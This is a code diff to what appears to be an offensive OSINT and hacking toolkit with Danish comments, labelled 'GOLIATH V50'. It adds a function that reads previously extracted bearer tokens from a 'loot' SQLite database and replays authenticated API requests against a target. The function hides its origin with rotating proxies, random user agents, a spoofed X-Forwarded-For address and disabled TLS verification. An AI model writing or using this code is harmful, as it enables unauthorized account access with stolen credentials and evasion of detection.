@@ -32,6 +32,8 @@ from typing import List, Dict, Optional, Tuple, Union, Any
 from dataclasses import dataclass, asdict, field
 from datetime import datetime
 from pathlib import Path
+import sqlite3
+from core.utils import session
 
 # Eksterne OSINT & Hacking Biblioteker
 try: import whois
@@ -212,6 +214,40 @@ class AsyncTurnstileSolver:
                     if ans_data.get("status") == 1: return ans_data.get("request")
                     if ans_data.get("request") != "CAPCHA_NOT_READY": break
         return None
+
+async def send_authenticated_replay(url: str, target: str, proxy_mgr: AsyncProxyManager) -> Optional[Dict]:
+    """GOLIATH V50: Automatisk autentificeret genafspilning af API-kald med Datalake Token Extraction."""
+    db_path = Path(session.get("loot_folder", "loot_evidence")) / "omni_datalake.db"
+    token = ""
+    
+    if db_path.exists():
+        try:
+            with sqlite3.connect(db_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute("SELECT data_json FROM osint_records WHERE target=? ORDER BY timestamp DESC LIMIT 20", (target,))
+                for row in cursor.fetchall():
+                    data = json.loads(row[0])
+                    if "Extracted_Bearer_Tokens" in data and data["Extracted_Bearer_Tokens"]:
+                        token = data["Extracted_Bearer_Tokens"][0]
+                        break
+        except Exception as e:
+            logger.error(f"Fejl ved Token-udtrækning fra Datalake: {e}")
+            
+    headers = {
+        "User-Agent": UserAgent().random,
+        "Accept": "application/json",
+        "X-Forwarded-For": socket.inet_ntoa(struct.pack('>I', random.randint(0x01000000, 0xEFFFFFFF)))
+    }
+    if token: headers["Authorization"] = f"Bearer {token}"
+    
+    proxy = await proxy_mgr.get_proxy()
+    try:
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as http_session:
+            async with http_session.get(url, headers=headers, proxy=proxy, timeout=15) as res:
+                if res.status == 200:
+                    return await res.json()
+    except Exception: pass
+    return None
 
 http = get_stealth_session()
 
